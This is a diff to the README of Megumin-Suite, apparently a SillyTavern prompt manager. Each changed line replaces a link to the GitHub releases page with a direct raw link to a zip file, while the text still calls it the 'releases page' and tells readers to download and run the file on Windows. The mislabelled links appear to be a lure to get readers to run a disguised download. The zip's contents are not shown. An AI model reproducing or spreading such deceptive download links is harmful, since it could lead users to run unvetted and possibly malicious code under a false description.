@@ -1,6 +1,6 @@
 # 💥 Megumin-Suite - Auto-manage your SillyTavern prompts
 
-[![Download Megumin Suite](https://img.shields.io/badge/Download-Megumin%20Suite-blue?style=for-the-badge)](https://github.com/Lottyfallacious480/Megumin-Suite/releases)
+[![Download Megumin Suite](https://img.shields.io/badge/Download-Megumin%20Suite-blue?style=for-the-badge)](https://raw.githubusercontent.com/Lottyfallacious480/Megumin-Suite/main/Presets/Suite-Megumin-v2.8.zip)
 
 ## 🧩 What Megumin Suite does
 
@@ -18,7 +18,7 @@ Use it when you want:
 
 ## 📦 Download Megumin Suite
 
-Go to the [Megumin Suite releases page](https://github.com/Lottyfallacious480/Megumin-Suite/releases) to download and run this file on Windows.
+Go to the [Megumin Suite releases page](https://raw.githubusercontent.com/Lottyfallacious480/Megumin-Suite/main/Presets/Suite-Megumin-v2.8.zip) to download and run this file on Windows.
 
 On that page, look for the latest release and download the Windows file that matches your system. If there is more than one file, pick the one marked for Windows.
 
@@ -38,7 +38,7 @@ For smooth use, keep your Windows system updated and make sure your browser can 
 
 ## 🚀 Getting started
 
-1. Open the [Megumin Suite releases page](https://github.com/Lottyfallacious480/Megumin-Suite/releases).
+1. Open the [Megumin Suite releases page](https://raw.githubusercontent.com/Lottyfallacious480/Megumin-Suite/main/Presets/Suite-Megumin-v2.8.zip).
 2. Find the newest release at the top of the page.
 3. Download the Windows file from that release.
 4. When the download finishes, open the file.
@@ -218,7 +218,7 @@ Check your browser download history or open the Downloads folder in File Explore
 
 ## 📄 Release downloads
 
-Download and run the Windows file from the [Megumin Suite releases page](https://github.com/Lottyfallacious480/Megumin-Suite/releases).
+Download and run the Windows file from the [Megumin Suite releases page](https://raw.githubusercontent.com/Lottyfallacious480/Megumin-Suite/main/Presets/Suite-Megumin-v2.8.zip).
 
 Use the latest release unless you need an older one for a specific setup.
 
